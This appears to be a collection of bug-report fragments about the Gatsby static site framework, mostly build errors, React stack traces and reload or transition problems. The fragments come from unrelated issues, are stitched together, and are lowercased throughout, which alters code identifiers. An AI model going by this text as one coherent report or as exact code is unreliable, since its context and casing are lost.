the graphql schema is different depending on the state of `.cache`.
if you opened the entry page in a new tab then you'll probably see whatever is the default starting page for a new browser tab
no redirect.
the app cannot be run from the localip when given `--host` switch
the placeholder remains opaque, and the main image loads over top of it.
[ { keyword: 'additionalproperties', datapath: '', schemapath: '#/additionalproperties', params: { additionalproperty: 'plugins' }, message: 'should not have additional properties' } ]
here ./.cache/develop-static-entry.js
module build failed (from ./node_modules/gatsby/dist/utils/babel-loader.js):
error: invalid configuration at pluginpass.program (/users/****/sites/****/hello-world/node_modules/babel-plugin-react-css-modules/dist/index.js:211:17) at newfn (/users/****/sites/****/hello-world/node_modules/@babel/traverse/lib/visitors.js:193:21) at nodepath._call (/users/****/sites/****/hello-world/node_modules/@babel/traverse/lib/path/context.js:53:20) at nodepath.call (/users/****/sites/****/hello-world/node_modules/@babel/traverse/lib/path/context.js:40:17) at nodepath.visit (/users/****/sites/****/hello-world/node_modules/@babel/traverse/lib/path/context.js:88:12) at traversalcontext.visitqueue (/users/****/sites/****/hello-world/node_modules/@babel/traverse/lib/context.js:118:16) at traversalcontext.visitsingle (/users/****/sites/****/hello-world/node_modules/@babel/traverse/lib/context.js:90:19) at traversalcontext.visit (/users/****/sites/****/hello-world/node_modules/@babel/traverse/lib/context.js:146:19) at function.traverse.node (/users/****/sites/****/hello-world/node_modules/@babel/traverse/lib/index.js:94:17) at traverse (/users/****/sites/****/hello-world/node_modules/@babel/traverse/lib/index.js:76:12) at transformfile (/users/****/sites/****/hello-world/node_modules/@babel/core/lib/transformation/index.js:88:29) at runsync (/users/****/sites/****/hello-world/node_modules/@babel/core/lib/transformation/index.js:45:3) at runasync (/users/****/sites/****/hello-world/node_modules/@babel/core/lib/transformation/index.js:35:14) at process.nexttick (/users/****/sites/****/hello-world/node_modules/@babel/core/lib/transform.js:34:34) at _combinedtickcallback (internal/process/next_tick.js:131:7) at process._tickcallback (internal/process/next_tick.js:180:9)
error there was an error compiling the html.js component for the development server
see our docs page on debugging html builds for help webpackerror: ./.cache/develop-static-entry.js - bootstrap:42 nodepath._call lib/webpack/bootstrap:42:1 - bootstrap:29 nodepath.call lib/webpack/bootstrap:29:1 - bootstrap:79 traversalcontext.visitsingle lib/webpack/bootstrap:79:1 - bootstrap:83 function.traverse.node lib/webpack/bootstrap:83:1 - bootstrap:24 runasync lib/webpack/bootstrap:24:1
vague error message.
show url with "?no-cache=1"
in development mode, it is not able to find the page, and showing 404 check this note: [note by pieh]( #issuecomment-421489295) by @pieh there is no need to findpage here as page is already in scope or do findpage by matchpath if it is set
// loader.js
if (process.env.node_env !== `production`) { const page = findpage(path) const pageresources = { component: syncrequires.components[page.componentchunkname], page, }
layout component itself still re-mounts on every route change.
the description shows unrendered markdown code
the transition happens immediately rather than fading.
the page goes blank and an error is shown in the console
syntax error in the "gatsby config" pointed out, while there\'s no error in `gatsby-config.js`.
<img width="385" alt="bildschirmfoto 2018-09-14 um 13 41 52" src=" ">
change does not appear, must manually refresh the page to see changes.
the content doesn't change until the dev process is restarted.
`<style id="typography.js">[object object]</style>` appears in the head and typography is not applied
test passes silently
graphql could query doesn't know `linked` property
new page content is not available unless you restart the `develop` command:
* true for js pages
* true for markdown pages frustrating as we have hot reload but not for pages :cry:
not see the new page
compiled css has a red hex value `#c00`, equivalent to `hsl(0, 100%, 40%)`
.foo { color: #c00;
it renders (see `curl` output) and it redirects to ` `.
the path prefix is not used
same path as the one used in development is present
resulting in a 404
removing the public and .cache folders does fix the problem
gatsby attempts to process the `plugins` array, modifies it and then handa it over to `styled-jsx`
this results in the expected options not being applied to `styled-jsx`.
build fails after stage `building static html for pages`.
sits on loading and never updates with data
it fails silently and appears to be loading forever.
production css is no longer minified.
the site build fails with errors.
the styles were jumbled.
blank page is shown until refresh occurs
there is the full stack trace:
error: ./src/layouts/base.js 14:7 module parse failed: identifier 'staticquerydata' has already been declared (14:7) you may need an appropriate loader to handle this file type
| | import staticquerydata from "../../public/static/d/3616221209.json"; > import staticquerydata from "../../public/static/d/114731346.json"; | import styled, { injectglobal, themeprovider } from "styled-components"; | import { staticquery } from "gatsby"; @ ./src/templates/post.js 2:0-41 16:29-39 @ ./.cache/async-requires.js @ ./.cache/production-app.js
``` my layout component:
import styled, {themeprovider} from "styled-components"
import {staticquery, graphql} from "gatsby"
import helmet from "react-helmet"
import react from "react" const layout = ({ children,
}) => ( <staticquery query={graphql` query baselayoutquery { site { sitemetadata { title } } } `} render={({site: {sitemetadata}}) => { return ( <react.fragment> <helmet> <html lang="fr" /> ..
</helmet> <themeprovider theme={theme}> <react.fragment> {children} </react.fragment> </themeprovider> </react.fragment> ) }} />
) export default layout
for a split second the text "second second second" gets displayed just before the normal "this is home home" comes.
the earth blows up and throws me errors.
here's the error output i have when starting the develop or build scripts: ```
success run graphql queries 0.100 s 9/9 91.96 queries/second
success write out page data 0.003 s
success write out redirect data 0.001 s
success onpostbootstrap 0.002 s
info bootstrap finished - 3.861 s
error generating javascript bundles failed error: ./.cache/production-app.js module build failed (from ./node_modules/gatsby/dist/utils/babel-loader.js): typeerror: programpath.hub.addhelper is not a function at wrapinterop (/home/travis/build/manoz/k-legrand.com/node_modules/@babel/plugin-transform-modules-commonjs/node_modules/@babel/helper-module-transform s/lib/index.js:165:45) at pluginpass.exit (/home/travis/build/manoz/k-legrand.com/node_modules/@babel/plugin-transform-modules-commonjs/lib/index.js:174:70) at newfn (/home/travis/build/manoz/k-legrand.com/node_modules/@babel/traverse/lib/visitors.js:193:21) at nodepath._call (/home/travis/build/manoz/k-legrand.com/node_modules/@babel/traverse/lib/path/context.js:53:20) at nodepath.call (/home/travis/build/manoz/k-legrand.com/node_modules/@babel/traverse/lib/path/context.js:40:17) at nodepath.visit (/home/travis/build/manoz/k-legrand.com/node_modules/@babel/traverse/lib/path/context.js:97:8) at traversalcontext.visitqueue (/home/travis/build/manoz/k-legrand.com/node_modules/@babel/traverse/lib/context.js:118:16) at traversalcontext.visitsingle (/home/travis/build/manoz/k-legrand.com/node_modules/@babel/traverse/lib/context.js:90:19) at traversalcontext.visit (/home/travis/build/manoz/k-legrand.com/node_modules/@babel/traverse/lib/context.js:146:19) at function.traverse.node (/home/travis/build/manoz/k-legrand.com/node_modules/@babel/traverse/lib/index.js:94:17) at traverse (/home/travis/build/manoz/k-legrand.com/node_modules/@babel/traverse/lib/index.js:76:12) at transformfile (/home/travis/build/manoz/k-legrand.com/node_modules/gatsby/node_modules/@babel/core/lib/transformation/index.js:88:29) at runsync (/home/travis/build/manoz/k-legrand.com/node_modules/gatsby/node_modules/@babel/core/lib/transformation/index.js:45:3) at runasync (/home/travis/build/manoz/k-legrand.com/node_modules/gatsby/node_modules/@babel/core/lib/transformation/index.js:35:14) at process.nexttick (/home/travis/build/manoz/k-legrand.com/node_modules/gatsby/node_modules/@babel/core/lib/transform.js:34:34) at _combinedtickcallback (internal/process/next_tick.js:131:7)
error there was an error compiling the html.js component for the development server
see our docs page on debugging html builds for help webpackerror: ./.cache/develop-static-entry.js - bootstrap:42 nodepath._call lib/webpack/bootstrap:42:1 - bootstrap:29 nodepath.call lib/webpack/bootstrap:29:1 - bootstrap:79 traversalcontext.visitsingle lib/webpack/bootstrap:79:1 - bootstrap:83 function.traverse.node lib/webpack/bootstrap:83:1 - bootstrap:24 runasync lib/webpack/bootstrap:24:1 - bootstrap:50 process._tickcallback lib/webpack/bootstrap:50:1
``` same issue with `gatsby build`
the current page does not fade out, but disappears abruptly, and the next page immediately fades in.
webpackerror: typeerror: cannot set property 'emulatetransitionend' of undefined - bootstrap.bundle.min.js:6 [lib]/[bootstrap]/dist/js/bootstrap.bundle.min.js:6:2232 - bootstrap.bundle.min.js:6 [lib]/[bootstrap]/dist/js/bootstrap.bundle.min.js:6:2424 - bootstrap.bundle.min.js:6 ./node_modules/bootstrap/dist/js/bootstrap.bundle.min.js.t [lib]/[bootstrap]/dist/js/bootstrap.bundle.min.js:6:16 - bootstrap.bundle.min.js:6 object../node_modules/bootstrap/dist/js/bootstrap.bundle.min.js [lib]/[bootstrap]/dist/js/bootstrap.bundle.min.js:6:194 - bootstrap:19 __webpack_require__ lib/webpack/bootstrap:19:1 - bootstrap:19 __webpack_require__ lib/webpack/bootstrap:19:1 - bootstrap:19 __webpack_require__ lib/webpack/bootstrap:19:1 - sync-requires.js:7 object../.cache/sync-requires.js lib/.cache/sync-requires.js:7:49 - bootstrap:19 __webpack_require__ lib/webpack/bootstrap:19:1 - static-entry.js:9 module../.cache/static-entry.js lib/.cache/static-entry.js:9:22 - bootstrap:19 __webpack_require__ lib/webpack/bootstrap:19:1 - bootstrap:83 lib/webpack/bootstrap:83:1 - universalmoduledefinition:3 webpackuniversalmoduledefinition lib/webpack/universalmoduledefinition:3:1
additional user config is not passed through the react-css-modules
createpages is called infinitely
you are taken back to the home page but scrolled down the page (at the exact same position you were when you linked the `page-2` link)
no live reload, no changes
user must stop and restart `gatsby develop` to see changes.
got an error: `can't call setstate (or forceupdate) on an unmounted component
this is a no-op, but it indicates a memory leak in your application
to fix, cancel all subscriptions and asynchronous tasks in the componentwillunmount method.`
it doesn't recognise the file as being a page component
in development mode these pages will be blank until you just save the template being used
after a browser reload all the pages will work as expected.
we get browser error in console:
<details> <summary>browser errors</summary> <pre><code>
uncaught typeerror: cannot read property 'markdownremark' of undefined at blogposttemplate (vm2221 blog-post.js:37) at proxycomponent.hotcomponentrender (d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:618) at proxycomponent.proxiedrender (d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:635) at finishclasscomponent (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13194) at updateclasscomponent (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13156) at beginwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13825) at performunitofwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15864) at workloop (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15903) at htmlunknownelement.callcallback (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:100) at object.invokeguardedcallbackdev (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:138) at invokeguardedcallback (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:187) at replayunitofwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15311) at renderroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15963) at performworkonroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16561) at performwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483) at performsyncwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455) at requestwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355) at schedulework$1 (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219) at object.enqueuesetstate (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300) at proxycomponent.component.setstate (d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270) at jsonstore._this.handlemittevent (vm2178 json-store.js:46) at eval (d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59) at array.map (<anonymous>) at object.emit (d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59) at r.eval (d:/projects/nicky-blog/.cache/socketio.js:65) at r.emit (index.js:83) at r.onevent (index.js:83) at r.onpacket (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.ondecoded (index.js:83) at a.<anonymous> (index.js:83) at a.r.emit (index.js:83) at a.add (index.js:83) at r.ondata (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.onpacket (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.onpacket (index.js:83) at r.ondata (index.js:83) at websocket.ws.onmessage (index.js:83)
blogposttemplate @ d:/projects/nicky-blog/src/templates/blog-post.js:37
hotcomponentrender @ d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:618
proxiedrender @ d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:635
finishclasscomponent @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13194
updateclasscomponent @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13156
beginwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13825
performunitofwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15864
workloop @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15903
callcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:100
invokeguardedcallbackdev @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:138
invokeguardedcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:187
replayunitofwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15311
renderroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15963
performworkonroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16561
performwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483
performsyncwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455
requestwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355
schedulework$1 @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219
enqueuesetstate @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300
component.setstate @ d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270
jsonstore._this.handlemittevent @ vm2178 json-store.js:46
(anonymous) @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
emit @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
(anonymous) @ d:/projects/nicky-blog/.cache/socketio.js:65
r.emit @ index.js:83
r.onevent @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.ondecoded @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
a.add @ index.js:83
r.ondata @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
r.ondata @ index.js:83
ws.onmessage @ index.js:83
d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172 the above error occurred in the <blogposttemplate> component: in blogposttemplate (created by pagerenderer) in pagerenderer (at json-store.js:93) in jsonstore (created by routehandler) in scrollcontext (at root.js:82) in routehandler (created by root) in div (created by focushandlerimpl) in focushandlerimpl in focushandler (created by routerimpl) in routerimpl (created by locationprovider) in locationprovider in location in router (created by root) in root (created by hotexportedroot) in appcontainer (created by hotexportedroot) in hotexportedroot (at app.js:55) react will try to recreate this component tree from scratch using the error boundary you provided, locationprovider.
__stack_frame_overlay_proxy_console__ @ d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172
__stack_frame_overlay_proxy_console__ @ d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172
logcapturederror @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14227
logerror @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14266
callback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14948
callcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:10879
commitupdatequeue @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:10923
commitlifecycles @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14378
commitalllifecycles @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15463
callcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:100
invokeguardedcallbackdev @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:138
invokeguardedcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:187
commitroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15604
completeroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16619
performworkonroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16564
performwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483
performsyncwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455
requestwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355
schedulework$1 @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219
enqueuesetstate @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300
component.setstate @ d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270
jsonstore._this.handlemittevent @ vm2178 json-store.js:46
(anonymous) @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
emit @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
(anonymous) @ d:/projects/nicky-blog/.cache/socketio.js:65
r.emit @ index.js:83
r.onevent @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.ondecoded @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
a.add @ index.js:83
r.ondata @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
r.ondata @ index.js:83
ws.onmessage @ index.js:83
d:/projects/nicky-blog/node_modules/@reach/router/es/index.js:123 uncaught typeerror: cannot read property 'markdownremark' of undefined at blogposttemplate (vm2221 blog-post.js:37) at proxycomponent.hotcomponentrender (d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:618) at proxycomponent.proxiedrender (d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:635) at finishclasscomponent (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13194) at updateclasscomponent (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13156) at beginwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13825) at performunitofwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15864) at workloop (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15903) at renderroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15943) at performworkonroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16561) at performwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483) at performsyncwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455) at requestwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355) at schedulework$1 (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219) at object.enqueuesetstate (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300) at proxycomponent.component.setstate (d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270) at jsonstore._this.handlemittevent (vm2178 json-store.js:46) at eval (d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59) at array.map (<anonymous>) at object.emit (d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59) at r.eval (d:/projects/nicky-blog/.cache/socketio.js:65) at r.emit (index.js:83) at r.onevent (index.js:83) at r.onpacket (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.ondecoded (index.js:83) at a.<anonymous> (index.js:83) at a.r.emit (index.js:83) at a.add (index.js:83) at r.ondata (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.onpacket (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.onpacket (index.js:83) at r.ondata (index.js:83) at websocket.ws.onmessage (index.js:83)
blogposttemplate @ d:/projects/nicky-blog/src/templates/blog-post.js:37
hotcomponentrender @ d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:618
proxiedrender @ d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:635
finishclasscomponent @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13194
updateclasscomponent @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13156
beginwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13825
performunitofwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15864
workloop @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15903
renderroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15943
performworkonroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16561
performwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483
performsyncwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455
requestwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355
schedulework$1 @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219
enqueuesetstate @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300
component.setstate @ d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270
jsonstore._this.handlemittevent @ vm2178 json-store.js:46
(anonymous) @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
emit @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
(anonymous) @ d:/projects/nicky-blog/.cache/socketio.js:65
r.emit @ index.js:83
r.onevent @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.ondecoded @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
a.add @ index.js:83
r.ondata @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
r.ondata @ index.js:83
ws.onmessage @ index.js:83
d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172 the above error occurred in the <locationprovider> component: in locationprovider in location in router (created by root) in root (created by hotexportedroot) in appcontainer (created by hotexportedroot) in hotexportedroot (at app.js:55) react will try to recreate this component tree from scratch using the error boundary you provided, appcontainer.
__stack_frame_overlay_proxy_console__ @ d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172
__stack_frame_overlay_proxy_console__ @ d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172
logcapturederror @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14227
logerror @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14266
callback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14948
callcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:10879
commitupdatequeue @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:10912
commitlifecycles @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14378
commitalllifecycles @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15463
callcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:100
invokeguardedcallbackdev @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:138
invokeguardedcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:187
commitroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15604
completeroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16619
performworkonroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16564
performwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483
performsyncwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455
requestwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355
schedulework$1 @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219
enqueuesetstate @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300
component.setstate @ d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270
jsonstore._this.handlemittevent @ vm2178 json-store.js:46
(anonymous) @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
emit @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
(anonymous) @ d:/projects/nicky-blog/.cache/socketio.js:65
r.emit @ index.js:83
r.onevent @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.ondecoded @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
a.add @ index.js:83
r.ondata @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
r.ondata @ index.js:83
ws.onmessage @ index.js:83
d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172 error: a cross-origin error was thrown
react doesn't have access to the actual error object in development
see for more information
at object.invokeguardedcallbackdev (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:145) at invokeguardedcallback (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:187) at commitroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15604) at completeroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16619) at performworkonroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16564) at performwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483) at performsyncwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455) at requestwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355) at schedulework$1 (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219) at object.enqueuesetstate (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300) at proxycomponent.component.setstate (d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270) at jsonstore._this.handlemittevent (vm2178 json-store.js:46) at eval (d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59) at array.map (<anonymous>) at object.emit (d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59) at r.eval (d:/projects/nicky-blog/.cache/socketio.js:65) at r.emit (index.js:83) at r.onevent (index.js:83) at r.onpacket (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.ondecoded (index.js:83) at a.<anonymous> (index.js:83) at a.r.emit (index.js:83) at a.add (index.js:83) at r.ondata (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.onpacket (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.onpacket (index.js:83) at r.ondata (index.js:83) at websocket.ws.onmessage (index.js:83)
__stack_frame_overlay_proxy_console__ @ d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172
__stack_frame_overlay_proxy_console__ @ d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172
error @ d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:188
componentdidcatch @ d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:1567
componentdidcatch @ d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:580
callback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14949
callcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:10879
commitupdatequeue @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:10912
commitlifecycles @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14378
commitalllifecycles @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15463
callcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:100
invokeguardedcallbackdev @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:138
invokeguardedcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:187
commitroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15604
completeroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16619
performworkonroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16564
performwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483
performsyncwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455
requestwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355
schedulework$1 @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219
enqueuesetstate @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300
component.setstate @ d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270
jsonstore._this.handlemittevent @ vm2178 json-store.js:46
(anonymous) @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
